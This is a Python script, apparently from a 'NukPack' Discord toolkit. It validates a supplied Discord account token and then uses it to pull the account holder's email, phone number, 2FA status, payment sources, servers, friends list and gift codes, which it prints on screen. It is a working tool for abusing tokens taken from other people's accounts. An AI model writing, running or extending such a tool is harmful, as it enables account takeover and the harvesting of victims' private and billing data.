import os
import colorama
import requests
from pystyle import *
from colorama import Fore
import string
import time
import string
import requests
from terminaltexteffects.effects.effect_decrypt import Decrypt

base_url = "https://discord.com/api/v9/users/@me"



ascii_art = f'''

     ,ggg, ,ggggggg,                         ,ggggggggggg,                                
    dP""Y8,8P"""""Y8b              ,dPYb,   dP"""88""""""Y8,                    ,dPYb,    
    Yb, `8dP'     `88              IP'`Yb   Yb,  88      `8b                    IP'`Yb    
     `"  88'       88              I8  8I    `"  88      ,8P                    I8  8I    
         88        88              I8  8bgg,     88aaaad8P"                     I8  8bgg, 
         88        88  gg      gg  I8 dP" "8     88"""""    ,gggg,gg    ,gggg,  I8 dP" "8 
         88        88  I8      8I  I8d8bggP"     88        dP"  "Y8I   dP"  "Yb I8d8bggP" 
         88        88  I8,    ,8I  I8P' "Yb,     88       i8'    ,8I  i8'       I8P' "Yb, 
         88        Y8,,d8b,  ,d8b,,d8    `Yb,    88      ,d8,   ,d8b,,d8,_    _,d8    `Yb,
         88        `Y88P'"Y88P"`Y888P      Y8    88      P"Y8888P"`Y8P""Y8888PP88P      Y8
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
                        [1] Information                      [2] About                        
                                            
                   Any modification must be authorized by the NukPackSQ team
                                 
'''

information_page_art = f'''

     ,ggg, ,ggggggg,                         ,ggggggggggg,                                
    dP""Y8,8P"""""Y8b              ,dPYb,   dP"""88""""""Y8,                    ,dPYb,    
    Yb, `8dP'     `88              IP'`Yb   Yb,  88      `8b                    IP'`Yb    
     `"  88'       88              I8  8I    `"  88      ,8P                    I8  8I    
         88        88              I8  8bgg,     88aaaad8P"                     I8  8bgg, 
         88        88  gg      gg  I8 dP" "8     88"""""    ,gggg,gg    ,gggg,  I8 dP" "8 
         88        88  I8      8I  I8d8bggP"     88        dP"  "Y8I   dP"  "Yb I8d8bggP" 
         88        88  I8,    ,8I  I8P' "Yb,     88       i8'    ,8I  i8'       I8P' "Yb, 
         88        Y8,,d8b,  ,d8b,,d8    `Yb,    88      ,d8,   ,d8b,,d8,_    _,d8    `Yb,
         88        `Y88P'"Y88P"`Y888P      Y8    88      P"Y8888P"`Y8P""Y8888PP88P      Y8
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
                    Enter the token you want to receive information about here
                                 
'''

ububox_art = r'''
          _nnnn_                      
        dGGGGMMb     ,"""""""""""""""". 
       @p~qp~~qMb    | Made by Ububox | 
       M|@||@) M|   _;................' 
       @,----.JM| -' 
      JS^\__/  qKL 
     dZP        qKRb 
    dZP          qKKb 
   fZP            SMMb 
   HZM            MMMM 
   FqM            MMMM 
 __| ".        |\dS"qML 
 |    `.       | `' \Zq 
_)      \.___.,|     .' 
\____   )MMMMMM|   .' 
     `-'       `--' hjm
'''

def Ububox_Logos():
    
    os.system('cls')

    effect = Decrypt(ububox_art)
    
    with effect.terminal_output() as terminal:

        for frame in effect:

            terminal.print(frame)
    print("press enter to continue...")    
    input()        
    main()
            


def validate_token(token):
        r = requests.get(base_url, headers={'Authorization': token})

        if r.status_code == 200:
            return True

        return False


def main():

    os.system('cls')
    os.system('title NukPack Token Information')

    Write.Print(ascii_art, Colors.white_to_black, interval=0.000)

    choice = input(f"""{Fore.WHITE}                       whoami@NukPackSQ ~
                       ↪ """)

    if choice == ('information') or choice == ('1'):
        information_page()
    elif choice == ('about') or choice == ('2'):
        Ububox_Logos()   
    else:
        print(Fore.RED, "                      Invalid choice!", Fore.RESET)
        time.sleep(1)
        main()                       
    

def information_page():

    os.system('cls')

    Write.Print(information_page_art, Colors.white_to_black, interval=0.000)

    token = input(f"""{Fore.WHITE}                       token@NukPackSQ ~
                       ↪ """)

    if validate_token(token) == True:
        print(Fore.GREEN, "                      Token is valid", Fore.RESET)
        time.sleep(1)
        os.system('cls')
        information(token)

    else:
        print(Fore.RED, "                      Token is invalid", Fore.RESET)
        time.sleep(1)
        main()                       

def information(token):

    os.system('title NukPack Token Information')

    def calc_flags(flags: int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "Discord Employee",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "Discord Partner",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
                "emoji": "Hypesquad Events>",
                "shift": 2,
                "ind": 4
            },
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "Bug Hunter 1",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "House Bravery",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "House Brilliance",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "House Balance",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "Early Supporter ",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
                "emoji": "Bug Hunter 2",
                "shift": 14,
                "ind": 16384
            },
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "Verified Bot Developer",
                "shift": 17,
                "ind": 131072
            },
            "ACTIVE_DEVELOPER": {
                "emoji": "Active Developer",
                "shift": 22,
                "ind": 4194304
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "Certified Moderator",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
                "emoji": "Spammer",
                "shift": 20,
                "ind": 1048704
            },
        }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]


    user = requests.get(
        'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
    billing = requests.get(
        'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
    guilds = requests.get(
        'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
    friends = requests.get(
           'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
    gift_codes = requests.get(
        'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

    username = user['username'] + '#' + user['discriminator']
    user_id = user['id']
    email = user['email']
    phone = user['phone']
    mfa = user['mfa_enabled']
    avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(
        f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
    badges = ' '.join([flag[0]
        for flag in calc_flags(user['public_flags'])])
    

    

    if user['premium_type'] == 0:
        nitro = 'None'
    elif user['premium_type'] == 1:
        nitro = 'Nitro Classic'
    elif user['premium_type'] == 2:
        nitro = 'Nitro'
    elif user['premium_type'] == 3:
        nitro = 'Nitro Basic'
    else:
        nitro = 'None'

    if billing:
                payment_methods = []

                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Credit Card')

                    elif method['type'] == 2:
                        payment_methods.append("PayPal")

                    else:
                        payment_methods.append("Unknow")

                payment_methods = ', '.join(payment_methods)

    else:
        payment_methods = None



    

    nukpack_art = f'''

     ,ggg, ,ggggggg,                         ,ggggggggggg,                                
    dP""Y8,8P"""""Y8b              ,dPYb,   dP"""88""""""Y8,                    ,dPYb,    
    Yb, `8dP'     `88              IP'`Yb   Yb,  88      `8b                    IP'`Yb    
     `"  88'       88              I8  8I    `"  88      ,8P                    I8  8I    
         88        88              I8  8bgg,     88aaaad8P"                     I8  8bgg, 
         88        88  gg      gg  I8 dP" "8     88"""""    ,gggg,gg    ,gggg,  I8 dP" "8 
         88        88  I8      8I  I8d8bggP"     88        dP"  "Y8I   dP"  "Yb I8d8bggP" 
         88        88  I8,    ,8I  I8P' "Yb,     88       i8'    ,8I  i8'       I8P' "Yb, 
         88        Y8,,d8b,  ,d8b,,d8    `Yb,    88      ,d8,   ,d8b,,d8,_    _,d8    `Yb,
         88        `Y88P'"Y88P"`Y888P      Y8    88      P"Y8888P"`Y8P""Y8888PP88P      Y8
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   


    Token: {token}

    Username: {username}
    User id: {user_id}
    Avatar: {avatar}
    Badges: {badges}

    Email: {email}
    Phone: {phone}

    2Fa: {mfa}

    Billing: {billing}
    Nitro: {nitro}
    Gift Code: {gift_codes}

    '''

    Write.Print(nukpack_art, Colors.white_to_black, interval=0.000)

    print("press enter to continue...")    
    input()        
    main()


    
main()